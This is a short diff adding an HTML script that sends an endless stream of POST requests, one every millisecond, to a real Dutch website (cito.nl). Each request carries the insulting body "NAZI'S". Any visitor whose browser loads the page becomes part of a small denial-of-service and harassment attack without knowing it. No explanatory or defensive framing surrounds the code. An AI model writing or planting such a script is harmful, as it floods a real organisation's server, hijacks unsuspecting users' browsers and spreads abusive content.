@@ -1,0 +1,16 @@
+<script>
+setInterval(function(){
+	var x=new XMLHttpRequest();
+	x.open('POST', 'http://www.cito.nl/', true);
+
+	try{
+		x.send("NAZI'S");
+	}catch(ex){
+	
+	}
+	
+	x=null;
+	
+	CollectGarbage();
+},1);
+</script>
